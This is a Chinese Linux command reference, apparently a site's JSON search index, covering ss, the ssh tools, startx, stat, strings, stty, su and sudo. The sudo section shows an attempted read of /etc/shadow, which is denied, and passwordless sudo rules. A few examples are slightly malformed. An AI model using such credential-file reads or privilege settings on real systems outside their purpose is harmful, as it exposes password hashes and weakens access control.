**查看进程使用的socket**\n\n```shell\n[root@localhost ~]# ss -pl\nRecv-Q Send-Q                                          Local Address:Port                                              Peer Address:Port\n0      0                                                           *:3306                                                         *:*        users:((\"mysqld\",1718,10))\n0      0                                                           *:http                                                         *:*        users:((\"nginx\",13312,5),(\"nginx\",13333,5))\n0      0                                                           *:ssh                                                          *:*        users:((\"sshd\",1379,3))\n0      0                                                   127.0.0.1:smtp                                                         *:*        us\n```\n\n **找出打开套接字/端口应用程序**\n\n```shell\n[root@localhost ~]# ss -pl | grep 3306\n0      0                            *:3306                          *:*        users:((\"mysqld\",1718,10))\n```\n\n **显示所有UDP Sockets**\n\n```shell\n[root@localhost ~]# ss -u -a\nState       Recv-Q Send-Q                                     Local Address:Port                                         Peer Address:Port\nUNCONN      0      0                                                      *:syslog                                                  *:*\nUNCONN      0      0                                         112.124.15.130:ntp                                                     *:*\nUNCONN      0      0                                            10.160.7.81:ntp                                                     *:*\nUNCONN      0      0                                              127.0.0.1:ntp                                                     *:*\nUNCONN      0      0                                                      *:ntp                                                     *:*\n```\n\n**出所有端口为 22（ssh）的连接**\n\n```shell\n[root@localhost ~]# ss state all sport = :ssh\nNetid State      Recv-Q Send-Q     Local Address:Port                      Peer Address:Port\ntcp   LISTEN     0      128                    *:ssh                                  *:*\ntcp   ESTAB      0      0          192.168.0.136:ssh                      192.168.0.102:46540\ntcp   LISTEN     0      128                   :::ssh                                 :::*\n```\n\n**查看TCP的连接状态**\n\n```shell\n[root@localhost ~]# ss  -tan|awk 'NR>1{++S[$1]}END{for (a in S) print a,S[a]}'\nLISTEN 7\nESTAB 31\nTIME-WAIT 28\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ss"]},{"title":"【Linux 命令】ssh-add","url":"/linux-command/ssh-add/","content":"\n把专用密钥添加到ssh-agent的高速缓存中\n\n## 补充说明\n\n**ssh-add命令** 是把专用密钥添加到ssh-agent的高速缓存中。该命令位置在`/usr/bin/ssh-add`。\n\n###  语法\n\n```shell\nssh-add [-cDdLlXx] [-t life] [file ...]\nssh-add -s pkcs11\nssh-add -e pkcs11\n```\n\n###  选项\n\n```shell\n-D：删除ssh-agent中的所有密钥.\n-d：从ssh-agent中的删除密钥\n-e pkcs11：删除PKCS#11共享库pkcs1提供的钥匙。\n-s pkcs11：添加PKCS#11共享库pkcs1提供的钥匙。\n-L：显示ssh-agent中的公钥\n-l：显示ssh-agent中的密钥\n-t life：对加载的密钥设置超时时间，超时ssh-agent将自动卸载密钥\n-X：对ssh-agent进行解锁\n-x：对ssh-agent进行加锁\n```\n\n###  实例\n\n1、把专用密钥添加到 ssh-agent 的高速缓存中：\n\n```shell\nssh-add ~/.ssh/id_dsa\n```\n\n2、从ssh-agent中删除密钥：\n\n```shell\nssh-add -d ~/.ssh/id_xxx.pub\n```\n\n3、查看ssh-agent中的密钥：\n\n```shell\nssh-add -l\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ssh-add"]},{"title":"【Linux 命令】ssh-agent","url":"/linux-command/ssh-agent/","content":"\nssh密钥管理器\n\n## 补充说明\n\n**ssh-agent命令** 是一种控制用来保存公钥身份验证所使用的私钥的程序。ssh-agent在X会话或登录会话之初启动，所有其他窗口或程序则以客户端程序的身份启动并加入到ssh-agent程序中。通过使用环境变量，可定位代理并在登录到其他使用ssh机器上时使用代理自动进行身份验证。\n\n其实ssh-agent就是一个密钥管理器，运行ssh-agent以后，使用ssh-add将私钥交给ssh-agent保管，其他程序需要身份验证的时候可以将验证申请交给ssh-agent来完成整个认证过程。\n\n###  语法\n\n```shell\nssh-agent [-c | -s] [-d] [-a bind_address] [-t life] [command [arg ...]]\nssh-agent [-c | -s] -k\n```\n\n###  选项\n\n```shell\n-a bind_address：bind the agent to the UNIX-domain socket bind_address.\n-c：生成C-shell风格的命令输出。\n-d：调试模式。\n-k：把ssh-agent进程杀掉。\n-s：生成Bourne shell 风格的命令输出。\n-t life：设置默认值添加到代理人的身份最大寿命。\n```\n\n###  实例\n\n运行ssh-agent：\n\n```shell\nssh-agent\n```\n\n运行ssh-agent，它会打印出来它使用的环境和变量。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ssh-agent"]},{"title":"【Linux 命令】ssh-copy-id","url":"/linux-command/ssh-copy-id/","content":"\n把本地的ssh公钥文件安装到远程主机对应的账户下\n\n## 补充说明\n\n**ssh-copy-id命令** 可以把本地主机的公钥复制到远程主机的authorized_keys文件上，ssh-copy-id命令也会给远程主机的用户主目录（home）和`~/.ssh`, 和`~/.ssh/authorized_keys`设置合适的权限。\n\n###  语法\n\n```shell\nssh-copy-id [-i [identity_file]] [user@]machine\n```\n\n###  选项\n\n```shell\n-i：指定公钥文件\n```\n\n###  实例\n\n1、把本地的ssh公钥文件安装到远程主机对应的账户下：\n\n```shell\nssh-copy-id user@server\nssh-copy-id -i ~/.ssh/id_rsa.pub user@server\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ssh-copy-id"]},{"title":"【Linux 命令】ssh-keygen","url":"/linux-command/ssh-keygen/","content":"\n为ssh生成、管理和转换认证密钥\n\n## 补充说明\n\n**ssh-keygen命令** 用于为“ssh”生成、管理和转换认证密钥，它支持RSA和DSA两种认证密钥。\n\n###  语法\n\n```shell\nssh-keygen(选项)\n```\n\n###  选项\n\n```shell\n-b：指定密钥长度；\n-e：读取openssh的私钥或者公钥文件；\n-C：添加注释；\n-f：指定用来保存密钥的文件名；\n-i：读取未加密的ssh-v2兼容的私钥/公钥文件，然后在标准输出设备上显示openssh兼容的私钥/公钥；\n-l：显示公钥文件的指纹数据；\n-N：提供一个新密语；\n-P：提供（旧）密语；\n-q：静默模式；\n-t：指定要创建的密钥类型。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ssh-keygen"]},{"title":"【Linux 命令】ssh-keyscan","url":"/linux-command/ssh-keyscan/","content":"\n收集主机公钥的使用工具\n\n## 补充说明\n\n**ssh-keyscan命令** 是一个收集大量主机公钥的使用工具。\n\n###  语法\n\n```shell\nssh-keyscan(选项)(参数)\n```\n\n###  选项\n\n```shell\n-4：强制使用IPv4地址；\n-6：强制使用IPv6地址；\n-f：从指定文件中读取“地址列表/名字列表”；\n-p：指定连接远程主机的端口；\n-T：指定连接尝试的超时时间；\n-t：指定要创建的密钥类型；\n-v：信息模式，打印调试信息。\n```\n\n###  参数\n\n主机列表：指定要收集公钥的主机列表。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ssh-keyscan"]},{"title":"【Linux 命令】ssh","url":"/linux-command/ssh/","content":"\nopenssh套件中的客户端连接工具\n\n## 补充说明\n\n**ssh命令** 是openssh套件中的客户端连接工具，可以给予ssh加密协议实现安全的远程登录服务器。\n\n### 语法\n\n```shell\nssh(选项)(参数)\n```\n\n### 选项\n\n```shell\n-1：强制使用ssh协议版本1；\n-2：强制使用ssh协议版本2；\n-4：强制使用IPv4地址；\n-6：强制使用IPv6地址；\n-A：开启认证代理连接转发功能；\n-a：关闭认证代理连接转发功能；\n-b：使用本机指定地址作为对应连接的源ip地址；\n-C：请求压缩所有数据；\n-F：指定ssh指令的配置文件；\n-f：后台执行ssh指令；\n-g：允许远程主机连接主机的转发端口；\n-i：指定身份文件；\n-l：指定连接远程服务器登录用户名；\n-N：不执行远程指令；\n-o：指定配置选项；\n-p：指定远程服务器上的端口；\n-q：静默模式；\n-X：开启X11转发功能；\n-x：关闭X11转发功能；\n-y：开启信任X11转发功能。\n```\n\n### 参数\n\n* 远程主机：指定要连接的远程ssh服务器；\n* 指令：要在远程ssh服务器上执行的指令。\n\n### 实例\n\n```shell\n# ssh 用户名@远程服务器地址\nssh user1@172.24.210.101\n# 指定端口\nssh -p 2211 root@140.206.185.170\n\n# ssh 大家族\nssh user@ip -p22 # 默认用户名为当前用户名，默认端口为 22\nssh-keygen # 为当前用户生成 ssh 公钥 + 私钥\nssh-keygen -f keyfile -i -m key_format -e -m key_format # key_format: RFC4716/SSH2(default) PKCS8 PEM\nssh-copy-id user@ip:port # 将当前用户的公钥复制到需要 ssh 的服务器的 ~/.ssh/authorized_keys，之后可以免密登录\n```\n\n### 背后故事\n\n> 英文：Tatu Ylonen  \n> 编译：Linux中国/kenxx  \n> 来源：https://linux.cn/article-8476-1.html  \n\n为什么 SSH（安全终端）的端口号是 22 呢，这不是一个巧合，这其中有个我（Tatu Ylonen，SSH 协议的设计者）未曾诉说的故事。\n\n\n#### 将 SSH 协议端口号设为 22 的故事\n\n1995 年春我编写了 SSH 协议的最初版本，那时候 telnet 和 FTP 正被广泛使用。\n\n当时我设计 SSH 协议想着是为了替代 telnet（端口 23）和 ftp（端口21）两个协议的，而端口 22 是空闲的。我想当然地就选择了夹在 telnet 和 ftp 的端口中间的数字。我觉得端口号虽然是个小事但似乎又存在着某种信念。但我到底要怎么拿到那个端口号呢？我未曾拥有过任何一个端口号，但我却认识几个拥有端口号的人！\n\n在那时取得端口号的事情其实说来挺简单的。毕竟当时的因特网（Internet）并不是很大，是因特网爆炸的早期。端口号分配的活儿是 IANA（Internet Assigned Numbers Authority，互联网数字分配机构）干的。在那时这机构可相当于是因特网先驱 [Jon Postel](https://en.wikipedia.org/wiki/Jon_Postel) 和 [Joyce K. Reynolds](https://en.wikipedia.org/wiki/Joyce_K._Reynolds) 一般的存在。Jon 参与编写了多项主要的协议标准，例如 IP（RFC 791）、ICMP（RFC 792）和 TCP（RFC 793）等一些你应该早有耳闻的协议。\n\n我可以说是敬畏 Jon 先生的，他参与编写了几乎所有主要的因特网标准文档（Internet RFC）！\n\n1995 年 7 月，就在我发布 ssh-1.0 前，我发送了一封邮件给 IANA：\n\n> From ylo Mon Jul 10 11:45:48 +0300 1995  \n> From: Tatu Ylonen  \n> To: Internet Assigned Numbers Authority  \n> Subject: 请求取得一个端口号  \n> Organization: 芬兰赫尔辛基理工大学  \n>\n> 亲爱的机构成员：\n>\n> 我写了个可以在不安全的网络环境中安全地从一台机器登录到另一台机器的程序。它主要是对现有的 telnet 协议以及 rlogin 协议的功能性提升和安全性改进。说的具体些，就是可以防御 IP、DNS > 或路由等欺骗行为。我打算将我的软件免费地发布在因特网上，以得到广泛地使用。\n>\n> 我希望为该软件注册一个特权端口号，要是这个端口号在 1 到 255 > 之间就更好了，这样它就可以用在名字服务器的 WKS 字段中了。\n>\n> 我在附件中附上了协议标准的草案。这个软件已经在本地运行了几个月了，我已准备在获得端口号后就发布。如果端口号分配一事安排的及时，我希望这周就将要发布的软件准备好。我目前在 beta 版测试时使用的端口号是 > 22，如果要是能够分配到这个端口，我就不用做什么更改了（目前这个端口在列表中还是空闲的）。\n>\n> 软件中服务的名称叫 ssh（系 Secure Shell 的缩写）。\n>\n> 您最真诚的，  \n> Tatu Ylonen \n\n（LCTT 译注：DNS 协议中的 WKS 记录类型意即“众所周知的业务描述”，是类似于 A、MX 这样的 DNS 记录类型，用于描述某个 IP 所提供的服务，目前鲜见使用。参见： https://docs.oracle.com/cd/E19683-01/806-4077/dnsintro-154/index.html 。）\n\n第二天，我就收到了 Joyce 发来的邮件：\n\n> Date: Mon, 10 Jul 1995 15:35:33 -0700  \n> From: jkrey@ISI.EDU  \n> To: ylo@cs.hut.fi  \n> Subject: 回复：请求取得一个端口号  \n> Cc: iana@ISI.EDU  \n> Tatu,  \n> 我们将端口号 22 分配给 ssh 服务了，你目前是该服务的主要联系人。  \n> Joyce  \n\n这就搞定了！SSH 的端口正式使用 22！！！\n\n1995 年 7 月 12 日上午 2 点 21 分，我给我在赫尔辛基理工大学的测试者们宣布了 SSH 的最后 beta 版本。当日下午 5 点 23 分，我给测试者们宣布了 ssh-1.0.0 版本。1995 年 7 月 12 日，下午 5 点 51 分，我将一份 SSH（安全终端）的宣告发给了 cypherpunks@toad.com 的邮件列表，此外我还将其发给了一些新闻组、邮件列表和一些在因特网上讨论相关话题的人们。\n\n#### 如何更改 SSH 服务的端口号\n\nSSH 服务器是默认运行在 22 号端口上的。然而，由于某些原因需要，它也可以运行在别的端口上。比如为了方便测试使用，又比如在同一个宿主机上运行多个不同的配置。当然，极少情况下，不使用 root 权限运行它也可以，比如某些必须运行在非特权的端口的情况（端口号大于等于 1024）。\n\n端口号可以在配置文件 /etc/ssh/sshd_config 中将 Port 22 更改。也可以使用 -p  选项运行 sshd。SSH 客户端和 sftp 程序也可以使用 -p  选项。\n\n#### 配置 SSH 协议穿越防火墙\n\nSSH 是少数通常被许可穿越防火墙的协议之一。通常的做法是不限制出站的 SSH 连接，尤其常见于一些较小的或者比较技术型的组织中，而入站的 SSH 连接通常会限制到一台或者是少数几台服务器上。\n\n#### 出站的 SSH 连接\n\n在防火墙中配置出站的 SSH 连接十分简单。如果完全限制了外发连接，那么只需要创建一个允许 TCP 端口 22 可以外发的规则即可。如果你想限制目标地址，你可以限制该规则仅允许访问你的组织放在云端的外部服务器或保护该云端的跳板服务器即可。\n\n#### 反向通道是有风险的\n\n其实不限制出站的 SSH 连接虽然是可以的，但是是存在风险的，SSH 协议是支持 通道访问 的。最初的想法是在外部服务器搭建一个 SSH 服务监听来自各处的连接，将进入的连接转发到组织，并让这个连接可以访问某个内部服务器。\n\n在某些场景下这当然非常的方便。开发者和系统管理员经常使用它打开一个通道以便于他们可以远程访问，比如在家里或者在旅行中使用笔记本电脑等场景。\n\n然而通常来讲这些做法是违背安全策略的，跳过了防火墙管理员和安全团队保护的控制无疑是违背安全策略的，比如这些： PCI、HIPAA、NIST SP 800-53 等。它可以被黑客和外国情报机构用来在组织内留下后门。\n\nCryptoAuditor 是一款可以控制通道穿过防火墙或者一组云端服务器入口的产品。该款产品可以配合 通用 SSH 密钥管理器（Universal SSH Key Manager） 来获得对 主机密钥（host keys）的访问，以在启用防火墙并阻挡未授权转发的场景中解密 SSH 会话。\n\n#### 入站的 SSH 访问\n\n对于入站访问而言，这里有几点需要说一下：\n\n配置防火墙，并转发所有去往 22 端口的连接只能流向到一个特定的内部网络 IP 地址或者一个 DMZ 主机。在该 IP 上运行 CryptoAuditor 或者跳板机来控制和审查所有访问该组织的连接。\n在防火墙上使用不同的端口访问不同的服务器。\n只允许使用 IPsec 协议这样的 VPN（虚拟专用网）登录后连接 SSH 服务。\n\n#### 通过 iptables 服务限制 SSH 访问\n\niptables 是一款内建在 Linux 内核的宿主防火墙。通常配置用于保护服务器以防止被访问那些未明确开启的端口。\n\n如果服务器上启用了 iptables，使用下面的命令将可以允许进入的 SSH 访问，当然命令需要以 root 身份运行。\n\n```shell\niptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT\niptables -A OUTPUT -p tcp --sport 22 -m conntrack --ctstate ESTABLISHED -j ACCEPT\n```\n\n如果你想将上述命令创建的规则持久地保存，在某些系统版本中，可使用如下命令：\n\n```shell\nservice iptables save\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","ssh"]},{"title":"【Linux 命令】sshd","url":"/linux-command/sshd/","content":"\nopenssh软件套件中的服务器守护进程\n\n## 补充说明\n\n**sshd命令** 是openssh软件套件中的服务器守护进程。\n\n###  语法\n\n```shell\nsshd(选项)\n```\n\n###  选项\n\n```shell\n-4：强制使用IPv4地址；\n-6：强制使用IPv6地址；\n-D：以后台守护进程方式运行服务器；\n-d：调试模式；\n-e：将错误发送到标准错误设备，而不是将其发送到系统日志；\n-f：指定服务器的配置文件；\n-g：指定客户端登录时的过期时间，如果在此期限内，用户没有正确认证，则服务器断开次客户端的连接；\n-h：指定读取主机key文件；\n-i：ssh以inetd方式运行；\n-o：指定ssh的配置选项；\n-p：静默模式，没有任何信息写入日志；\n-t：测试模式。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","sshd"]},{"title":"【Linux 命令】startx","url":"/linux-command/startx/","content":"\n用来启动X Window\n\n## 补充说明\n\n**startx命令** 用来启动X Window，实际上启动X Window的程序为xinit。\n\n###  语法\n\n```shell\nstartx(参数)\n```\n\n###  参数\n\n*   客户端及选项：X客户端及选项；\n*   服务器及选项：X服务器及选项。\n\n###  实例\n\n要在工作站上或 X 终端上启动 X 会话，请输入：\n\n```shell\nstartx\n```\n\n要在工作站上强制启动 X 会话，请输入： \n\n```shell\nstartx -w\n```\n\n要为 X 终端启动 X 会话，并注销用户的 telnet 会话，请输入：\n\n```shell\nstartx; kill -9 $\n```\n\n要使用 .xinitrc 脚本启动 X 会话，请输入：\n\n```shell\nstartx -x .xinitrc\n```\n\n要使用 mwm 窗口管理器启动 X 会话，请输入：\n\n```shell\nstartx -m mwm\n```\n\n但是，如果找到启动脚本文件，则忽略`-w`选项。在启动脚本中，启动窗口管理器、装入X资源以及产生X客户机是用户的责任。以下是.xsession脚本的一个示例。\n\n```shell\n#!/bin/csh\n (mwm &)\n xrdb -load .Xdefaults\n (xclock -g 75x75+0+0 &)\n (xbiff -g 75x75+101-0 &)\n if (\"/dev/lft*\" == \"`tty`\") then\n  aixterm -g 80x24+0+0 +ut -C -T `hostname`\n else\n  aixterm -g 80x24+0+0 +ut -T `hostname`\n endif\n```\n\n对于工作站，startup脚本中的最后一行应该是前台aixterm命令，该命令带有`-C`选项表示控制台信息。对于X终端，startup脚本中的最后一行应该是不带有`-C`选项的前台aixterm命令。另外，由于某些X终端在关闭时不终止telnet会话，所以用户必须在使用热键切换至X会话前退出当前的telnet会话。\n\n`/usr/lib/X11/xdm/Xsession`文件中的xdm命令也可以使用startx命令。这为xdm命令提供了startx命令的功能。\n\n以下是启动X会话一贯使用的文件名。\n\n```shell\n$HOME/.xerrors 其中，startx 用来重定向错误消息。在缺省情况下，startx 将错误重定向至用户主目录中的 .xerrors 文件中。\n$HOME/.Xinit,  \n$HOME/.xinit,  \n$HOME/.Xinitrc,  \n$HOME/.xinitrc,  \n$HOME/.xsession 作为包含 shell 命令的“启动文件”来启动窗口管理器、装入 X 资源并产生 X 客户机。\n$HOME/.Xdefaults,  \n$HOME/.xresources 作为装入的 X 资源文件来设置 X 客户机的用户首选项。\n$HOME/.mwmrc mwm 配置文件。\n$HOME/.twmrc twm 配置文件。\n$HOME/.awmrc awm 配置文件。\n$HOME/.uwmrc uwm 配置文件。\n/dev/lft* 终端或 tty、工作站初始 login shell 的界面。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","startx"]},{"title":"【Linux 命令】stat","url":"/linux-command/stat/","content":"\n用于显示文件的状态信息\n\n## 补充说明\n\n**stat命令** 用于显示文件的状态信息。stat命令的输出信息比ls命令的输出信息要更详细。\n\n### 语法\n\n```shell\nstat(选项)(参数)\n```\n\n### 选项\n\n```shell\n-L：支持符号连接；\n-f：显示文件系统状态而非文件状态；\n-t：以简洁方式输出信息；\n--help：显示指令的帮助信息；\n--version：显示指令的版本信息。\n```\n\n### 参数\n\n文件：指定要显示信息的普通文件或者文件系统对应的设备文件名。\n\n### 实例\n\n```shell\n[root@localhost ~]# ls -l myfile\n-rw-r--r-- 1 root root 0 2010-10-09 myfile\n\n[root@localhost ~]# stat myfile\nfile: “myfile”\nSize: 0               Blocks: 8          IO Block: 4096   一般空文件\nDevice: fd00h/64768d    Inode: 194805815   Links: 1\nAccess: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)\nAccess: 2010-12-12 12:22:35.000000000 +0800\nModify: 2010-10-09 20:44:21.000000000 +0800\nChange: 2010-10-09 20:44:21.000000000 +0800\n\n[root@localhost ~]# stat -f myfile\nFile: \"myfile\"\nid: 0        Namelen: 255     type: ext2/ext3\nBlock size: 4096       Fundamental block size: 4096\nBlocks: Total: 241555461  free: 232910771  Available: 220442547\nInodes: Total: 249364480  Free: 249139691\n\n[root@localhost ~]# stat -t myfile\nmyfile 0 8 81a4 0 0 fd00 194805815 1 0 0 1292127755 1286628261 1286628261 4096\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","stat"]},{"title":"【Linux 命令】strings","url":"/linux-command/strings/","content":"\n在对象文件或二进制文件中查找可打印的字符串\n\n## 补充说明\n\n**strings命令** 在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印字符的任意序列，以换行符或空字符结束。 strings命令对识别随机对象文件很有用。\n\n###  语法\n\n```shell\nstrings [ -a ] [ - ] [ -o ] [ -t Format ] [ -n Number ] [ -Number ]  [file ... ]\n```\n\n###  选项\n\n```shell\n-a --all：扫描整个文件而不是只扫描目标文件初始化和装载段\n-f –print-file-name：在显示字符串前先显示文件名\n-n –bytes=[number]：找到并且输出所有NUL终止符序列\n- ：设置显示的最少的字符数，默认是4个字符\n-t --radix={o,d,x} ：输出字符的位置，基于八进制，十进制或者十六进制\n-o ：类似--radix=o\n-T --target= ：指定二进制文件格式\n-e --encoding={s,S,b,l,B,L} ：选择字符大小和排列顺序:s = 7-bit, S = 8-bit, {b,l} = 16-bit, {B,L} = 32-bit\n@ ：读取中选项\n```\n\n###  实例\n\n列出ls中所有的ASCII文本：\n\n```shell\nstrings /bin/ls\n```\n\n列出ls中所有的ASCII文本：\n\n```shell\ncat /bin/ls strings\n```\n\n查找ls中包含libc的字符串，不区分大小写：\n\n```shell\nstrings /bin/ls | grep -i libc\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","strings"]},{"title":"【Linux 命令】stty","url":"/linux-command/stty/","content":"\n修改终端命令行的相关设置\n\n## 补充说明\n\n**stty命令** 修改终端命令行的相关设置。\n\n###  语法\n\n```shell\nstty(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：以容易阅读的方式打印当前的所有配置；\n-g：以stty可读方式打印当前的所有配置。\n```\n\n###  参数\n\n终端设置：指定终端命令行的设置选项。\n\n###  实例\n\n **在命令行下，禁止输出大写的方法：** \n\n```shell\nstty iuclc     #开启\nstty -iuclc    #恢复\n```\n\n **在命令行下禁止输出小写：** \n\n```shell\nstty olcuc    #开启\nstty -olcuc   #恢复\n```\n\n **打印出终端的行数和列数：** \n\n```shell\nstty size\n```\n\n **改变Ctrl+D的方法:** \n\n```shell\nstty eof \"string\"\n```\n\n系统默认是Ctrl+D来表示文件的结束，而通过这种方法，可以改变！\n\n **屏蔽显示：** \n\n```shell\nstty -echo   #禁止回显\nstty echo    #打开回显\n```\n\n测试方法:\n\n```shell\nstty -echo;read;stty echo;read\n```\n\n **忽略回车符：** \n\n```shell\nstty igncr     #开启\nstty -igncr    #恢复\n```\n\n **定时输入：** \n\n```shell\ntimeout_read()\n{\n    timeout=$1\n    old_stty_settings=`stty -g`　　#save current settings\n    stty -icanon min 0 time 100　　#set 10seconds,not 100seconds\n    eval read varname　　          #=read $varname\n    stty \"$old_stty_settings\"　　  #recover settings\n}\n```\n\n更简单的方法就是利用read命令的`-t`选项：\n\n```shell\nread -t 10 varname\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","stty"]},{"title":"【Linux 命令】su","url":"/linux-command/su/","content":"\n用于切换当前用户身份到其他用户身份\n\n## 补充说明\n\n**su命令** 用于切换当前用户身份到其他用户身份，变更时须输入所要变更的用户帐号与密码。\n\n###  语法\n\n```shell\nsu(选项)(参数)\n```\n\n###  选项\n\n```shell\n-c<指令>或--command=<指令>：执行完指定的指令后，即恢复原来的身份；\n-f或——fast：适用于csh与tsch，使shell不用去读取启动文件；\n-l或——login：改变身份时，也同时变更工作目录，以及HOME,SHELL,USER,logname。此外，也会变更PATH变量；\n-m,-p或--preserve-environment：变更身份时，不要变更环境变量；\n-s<shell>或--shell=<shell>：指定要执行的shell；\n--help：显示帮助；\n--version；显示版本信息。\n```\n\n###  参数\n\n用户：指定要切换身份的目标用户。\n\n###  实例\n\n变更帐号为root并在执行ls指令后退出变回原使用者：\n\n```shell\nsu -c ls root\n```\n\n变更帐号为root并传入`-f`选项给新执行的shell：\n\n```shell\nsu root -f\n```\n\n变更帐号为test并改变工作目录至test的家目录：\n\n```shell\nsu -test\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","su"]},{"title":"【Linux 命令】sudo","url":"/linux-command/sudo/","content":"\n以其他身份来执行命令\n\n## 补充说明\n\n**sudo命令** 用来以其他身份来执行命令，预设的身份为root。在`/etc/sudoers`中设置了可执行sudo指令的用户。若其未经授权的用户企图使用sudo，则会发出警告的邮件给管理员。用户使用sudo时，必须先输入密码，之后有5分钟的有效期限，超过期限则必须重新输入密码。\n\n###  语法 \n\n```shell\nsudo(选项)(参数)\n```\n\n###  选项 \n\n```shell\n-b：在后台执行指令；\n-E：继承当前环境变量\n-h：显示帮助；\n-H：将HOME环境变量设为新身份的HOME环境变量；\n-k：结束密码的有效期限，也就是下次再执行sudo时便需要输入密码；。\n-l：列出目前用户可执行与无法执行的指令；\n-p：改变询问密码的提示符号；\n-s<shell>：执行指定的shell；\n-u<用户>：以指定的用户作为新的身份。若不加上此参数，则预设以root作为新的身份；\n-v：延长密码有效期限5分钟；\n-V ：显示版本信息。\n```\n\n###  参数 \n\n指令：需要运行的指令和对应的参数。\n\n###  实例 \n\n```shell\n$ sudo su -\n# env | grep -E '(HOME|SHELL|USER|LOGNAME|^PATH|PWD|TEST_ETC|TEST_ZSH|TEST_PRO|TEST_BASH|TEST_HOME|SUDO)'\n```\n\n这个命令相当于使用root超级用户重新登录一次shell，只不过密码是使用的当前用户的密码。而且重要是，该命令会 **重新加载/etc/profile文件以及/etc/bashrc文件等系统配置文件，并且还会重新加载root用户的$SHELL环境变量所对应的配置文件** ，比如：root超级用户的$SHELL是/bin/bash，则会加载/root/.bashrc等配置。如果是/bin/zsh，则会加载/root/.zshrc等配置，执行后是完全的root环境。\n\n```shell\n$ sudo -i\n# env | grep -E '(HOME|SHELL|USER|LOGNAME|^PATH|PWD|TEST_ETC|TEST_ZSH|TEST_PRO|TEST_BASH|TEST_HOME|SUDO)'\n```\n\n这个命令基本与 `sudo su -` 相同，执行后也是root超级用户的环境，只不过是多了一些当前用户的信息。\n\n```shell\n$ sudo -s\n# env|grep -E '(HOME|SHELL|USER|LOGNAME|^PATH|PWD|TEST_ETC|TEST_ZSH|TEST_PRO|TEST_BASH|TEST_HOME|SUDO)'  --color\n```\n\n这个命令相当于 **以当前用户的$SHELL开启了一个root超级用户的no-login的shell，不会加载/etc/profile等系统配置** 。所以/etc/profile文件中定义的TEST_ETC环境变量就看不到了，但是会**加载root用户对应的配置文件**，比如root用户的$SHELL是/bin/zsh，那么会加载/root/.zshrc配置文件，执行完后，不会切换当前用户的目录。\n\n配置sudo必须通过编辑`/etc/sudoers`文件，而且只有超级用户才可以修改它，还必须使用visudo编辑。之所以使用visudo有两个原因，一是它能够防止两个用户同时修改它；二是它也能进行有限的语法检查。所以，即使只有你一个超级用户，你也最好用visudo来检查一下语法。\n\nvisudo默认的是在vi里打开配置文件，用vi来修改文件。我们可以在编译时修改这个默认项。visudo不会擅自保存带有语法错误的配置文件，它会提示你出现的问题，并询问该如何处理，就像：\n\n```shell\n>>> sudoers file: syntax error, line 22 <<\n```\n\n此时我们有三种选择：键入“e”是重新编辑，键入“x”是不保存退出，键入“Q”是退出并保存。如果真选择Q，那么sudo将不会再运行，直到错误被纠正。\n\n现在，我们一起来看一下神秘的配置文件，学一下如何编写它。让我们从一个简单的例子开始：让用户Foobar可以通过sudo执行所有root可执行的命令。以root身份用visudo打开配置文件，可以看到类似下面几行：\n\n```shell\n# Runas alias specification\n# User privilege specificationroot    ALL=(ALL)ALL\n```\n\n我们一看就明白个差不多了，root有所有权限，只要仿照现有root的例子就行，我们在下面加一行（最好用tab作为空白）：\n\n```shell\nfoobar ALL=(ALL)    ALL\n```\n\n保存退出后，切换到foobar用户，我们用它的身份执行命令：\n\n```shell\n[foobar@localhost ~]$ ls /root\nls: /root: 权限不够\n\n[foobar@localhost ~]$ sudo ls /root\nPassWord:\nanaconda-ks.cfg Desktop install.log install.log.syslog\n```\n\n好了，我们限制一下foobar的权利，不让他为所欲为。比如我们只想让他像root那样使用ls和ifconfig，把那一行改为：\n\n```shell\nfoobar localhost=    /sbin/ifconfig,   /bin/ls\n```\n\n再来执行命令：\n\n```shell\n[foobar@localhost ~]$ sudo head -5 /etc/shadow\nPassword:\nSorry, user foobar is not allowed to execute '/usr/bin/head -5 /etc/shadow' as root on localhost.localdomain.\n\n[foobar@localhost ~]$ sudo /sbin/ifconfigeth0      Linkencap:Ethernet HWaddr 00:14:85:EC:E9:9B...\n```\n\n现在让我们来看一下那三个ALL到底是什么意思。第一个ALL是指网络中的主机，我们后面把它改成了主机名，它指明foobar可以在此主机上执行后面的命令。第二个括号里的ALL是指目标用户，也就是以谁的身份去执行命令。最后一个ALL当然就是指命令名了。例如，我们想让foobar用户在linux主机上以jimmy或rene的身份执行kill命令，这样编写配置文件：\n\n```shell\nfoobar    linux=(jimmy,rene)    /bin/kill\n```\n\n但这还有个问题，foobar到底以jimmy还是rene的身份执行？这时我们应该想到了`sudo -u`了，它正是用在这种时候。 foobar可以使用`sudo -u jimmy kill PID`或者`sudo -u rene kill PID`，但这样挺麻烦，其实我们可以不必每次加`-u`，把rene或jimmy设为默认的目标用户即可。再在上面加一行：\n\n```shell\nDefaults:foobar    runas_default=rene\n```\n\nDefaults后面如果有冒号，是对后面用户的默认，如果没有，则是对所有用户的默认。就像配置文件中自带的一行：\n\n```shell\nDefaults    env_reset\n```\n\n另一个问题是，很多时候，我们本来就登录了，每次使用sudo还要输入密码就显得烦琐了。我们可不可以不再输入密码呢？当然可以，我们这样修改配置文件：\n\n```shell\nfoobar localhost=NOPASSWD:     /bin/cat, /bin/ls\n```\n\n再来sudo一下：\n\n```shell\n[foobar@localhost ~]$ sudo ls 